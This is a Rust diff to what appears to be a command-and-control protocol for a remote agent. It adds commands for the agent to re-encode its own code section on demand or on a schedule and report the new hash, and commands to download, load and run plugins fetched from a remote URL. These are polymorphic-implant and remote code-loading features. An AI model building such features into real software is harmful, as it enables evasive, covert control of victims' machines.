@@ -67,6 +67,10 @@ pub enum Message {
     TaskResponse {
         task_id: String,
         result: Result<String, String>,
+        /// Optional binary result data from `ExecutePluginBinary`.
+        /// `None` for all other command responses.
+        #[serde(default)]
+        result_data: Option<Vec<u8>>,
     },
     /// Push a signed, AES-GCM-encrypted capability module to the agent.
     /// `encrypted_blob` is the same wire format produced by
@@ -75,6 +79,14 @@ pub enum Message {
         module_name: String,
         version: String,
         encrypted_blob: Vec<u8>,
+    },
+    /// Agent reports the SHA-256 hash of its `.text` section after a morph
+    /// operation.  Sent both in response to `MorphNow` (carried in
+    /// `TaskResponse.result`) and proactively after the initial check-in
+    /// morph triggered by the server-supplied seed.
+    MorphResult {
+        connection_id: String,
+        text_hash: String,
     },
     AuditLog(AuditEvent),
     Shutdown,
@@ -149,6 +161,47 @@ pub enum Command {
     },
     /// Return a JSON-serialized snapshot of running processes.
     ListProcesses,
+    /// Set the seed used for periodic self-re-encoding of the agent's own
+    /// `.text` section.  The seed is combined with a timestamp to derive a
+    /// unique transformation on each re-encoding pass.  Only effective when
+    /// the `self-reencode` feature is compiled in.
+    SetReencodeSeed {
+        seed: u64,
+    },
+    /// Immediately re-encode the agent's `.text` section with the supplied
+    /// seed and report a SHA-256 hash of the new `.text` section back to
+    /// the server.  Unlike `SetReencodeSeed` (which only stores the seed for
+    /// the next periodic cycle), `MorphNow` triggers a synchronous
+    /// transformation and returns the resulting hash in the `TaskResponse`.
+    MorphNow {
+        seed: u64,
+    },
+    /// Return a JSON array of metadata for all loaded plugins.
+    ListPlugins,
+    /// Remove a plugin from the loaded-plugin registry and release its resources.
+    UnloadPlugin {
+        plugin_id: String,
+    },
+    /// Return the full `PluginMetadata` for a specific loaded plugin.
+    GetPluginInfo {
+        plugin_id: String,
+    },
+    /// Download a module from the configured `module_repo_url` or a specified
+    /// URL, store it in the cache directory, and optionally load it.
+    DownloadModule {
+        module_id: String,
+        repo_url: Option<String>,
+    },
+    /// Execute a loaded plugin using the binary I/O path.  Returns raw bytes
+    /// via `TaskResponse.result_data`.
+    ExecutePluginBinary {
+        plugin_id: String,
+        input_data: Vec<u8>,
+    },
+    /// Query the status of an asynchronous plugin job.
+    JobStatus {
+        job_id: String,
+    },
 }
 
 /// Errors produced by [`CryptoSession`].
